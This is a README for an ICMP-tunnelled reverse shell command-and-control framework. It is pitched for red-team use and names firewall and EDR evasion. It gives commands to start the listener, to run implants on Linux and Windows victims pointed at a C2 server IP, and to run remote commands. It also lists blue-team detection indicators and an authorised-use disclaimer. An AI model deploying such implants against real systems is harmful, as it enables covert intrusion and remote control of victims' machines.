# ICMP Reverse Shell | Red Team C2 Framework

A stealthy, production-ready Command & Control (C2) framework that tunnels reverse shell traffic through ICMP packets (ping). Designed for authorized red team operations to bypass traditional network defenses.

## 📌 Overview

This tool establishes a reverse shell between an implant and a C2 server using only ICMP echo requests and replies. Most organizations allow ICMP traffic (ping) through firewalls, making this an effective evasion technique for red team assessments.

**Why ICMP?**
- Rarely blocked by firewalls
- Bypasses TCP/UDP inspection
- Blends with legitimate ping traffic
- Evades traditional EDR solutions

## 🏗️ Project Structure
icmp_reverse_shell/
├── server.py # C2 listener (attacker machine)
├── client_linux.py # Implant for Linux targets
├── client_windows.py # Implant for Windows targets
├── packet_scanner.py # Blue team detection tool
├── encoder.py # XOR encryption module
├── linked_scanner.py # Integrated monitor + detector
└── README.md # Documentation


## 🚀 Quick Start

### Prerequisites

- Python 3.7+
- Root/Administrator privileges (raw sockets)

### 1. Start the C2 Server (Attacker Machine)

```bash
sudo python3 server.py


Deploy Implant (Victim Machine)
Linux Target:

bash
sudo python3 client_linux.py <C2_SERVER_IP>
Windows Target (Run as Administrator):

bash
python client_windows.py <C2_SERVER_IP>
3. Monitor for Detection (Blue Team)
bash
sudo python3 packet_scanner.py --verbose
4. Linked Scanner (Integrated)
bash
sudo python3 linked_scanner.py --report
🎮 C2 Server Commands
Once implant connects:

bash
list                      # Show connected implants
select 192.168.1.50      # Select target
whoami                    # Execute command
ls -la /tmp              # Execute command
exit                      # Close shell
🔒 Encryption Module
python
from encoder import XOREncoder

encoder = XOREncoder()
encrypted = encoder.obfuscate_command("whoami")
decrypted = encoder.deobfuscate_command(encrypted)
📊 Detection Indicators (For Blue Teams)
Large ICMP payloads (>50 bytes)

Repeated ICMP requests to single destination

Keywords: HELLO, HEARTBEAT, READY

Unusual ICMP ID patterns

⚠️ Legal & Ethical Use
This tool is for authorized security assessments only.

Use only on systems you own

Use only with written permission

Never use against unauthorized targets

